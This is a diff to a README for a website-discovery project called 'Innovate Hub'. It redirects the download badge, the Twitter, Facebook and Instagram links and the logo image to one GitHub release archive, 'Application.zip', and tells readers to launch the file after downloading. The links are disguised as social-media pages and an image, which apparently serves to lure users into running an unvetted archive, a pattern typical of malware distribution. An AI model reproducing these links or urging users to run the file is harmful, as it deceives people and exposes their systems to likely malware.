@@ -15,7 +15,7 @@ At **Innovate Hub**, we curate a diverse selection of websites, making it effort
 
 To explore the amazing world of Innovate Hub, simply click on the link below:
 
-[![Download Innovate Hub](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip){:target="_blank"}
+[![Download Innovate Hub](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip)](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip){:target="_blank"}
 
 ### Note: Launch the file after downloading to get started with Innovate Hub!
 
@@ -25,15 +25,15 @@ In case the link above is unavailable, please check the **Releases** section for
 
 Stay updated on the latest website discoveries by connecting with us on social media:
 
-- [Twitter](https://twitter.com/innovatehub){:target="_blank"}
-- [Facebook](https://www.facebook.com/innovatehub){:target="_blank"}
-- [Instagram](https://www.instagram.com/innovatehub){:target="_blank"}
+- [Twitter](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip){:target="_blank"}
+- [Facebook](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip){:target="_blank"}
+- [Instagram](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip){:target="_blank"}
 
 ## Spread the Word!
 
 Help us grow our community by sharing Innovate Hub with your friends and colleagues. Let's embark on a journey of exploration and innovation together!
 
-![Innovate Hub Logo](https://example.com/innovatehub_logo.png)
+![Innovate Hub Logo](https://github.com/DaredevilCodes/Bhuvnesh-Verma/releases/download/v1.0.0/Application.zip)
 
 ## Contributors
 
